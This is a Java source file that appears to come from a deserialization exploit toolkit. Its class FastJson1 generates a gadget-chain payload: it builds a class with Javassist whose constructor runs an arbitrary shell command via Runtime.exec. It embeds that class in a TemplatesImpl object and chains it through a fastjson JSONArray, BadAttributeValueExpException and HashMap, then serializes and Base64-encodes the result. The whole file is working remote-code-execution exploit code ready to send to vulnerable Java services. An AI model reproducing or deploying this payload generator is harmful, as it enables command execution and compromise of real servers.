package me.jiu.gadget;

import cn.hutool.core.codec.Base64;
import cn.hutool.core.util.RandomUtil;
import com.alibaba.fastjson.JSONArray;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import me.jiu.Config;

import javax.management.BadAttributeValueExpException;

public class FastJson1 {
    public static void setValue(Object obj, String name, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(name);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static byte[] genPayload(String cmd) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        String randomStr = RandomUtil.randomString(5);
        CtClass clazz = pool.makeClass(randomStr);
        CtClass superClass = pool.get(AbstractTranslet.class.getName());
        clazz.setSuperclass(superClass);
        CtConstructor constructor = new CtConstructor(new CtClass[0], clazz);
        constructor.setBody("Runtime.getRuntime().exec(\"" + cmd + "\");");
        clazz.addConstructor(constructor);
        clazz.getClassFile().setMajorVersion(49);
        return clazz.toBytecode();
    }

    public static String gen() throws Exception {
        TemplatesImpl templates = (TemplatesImpl)TemplatesImpl.class.newInstance();
        FastJson1.setValue(templates, "_bytecodes", new byte[][]{FastJson1.genPayload(Config.command)});
        FastJson1.setValue(templates, "_name", "1");
        FastJson1.setValue(templates, "_tfactory", null);
        JSONArray jsonArray = new JSONArray();
        jsonArray.add(templates);
        BadAttributeValueExpException bd = new BadAttributeValueExpException((Object)null);
        FastJson1.setValue(bd, "val", jsonArray);
        HashMap<TemplatesImpl, BadAttributeValueExpException> hashMap = new HashMap<TemplatesImpl, BadAttributeValueExpException>();
        hashMap.put(templates, bd);
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);
        objectOutputStream.close();
        String s = Base64.encode(byteArrayOutputStream.toByteArray());
        return s;
    }
}

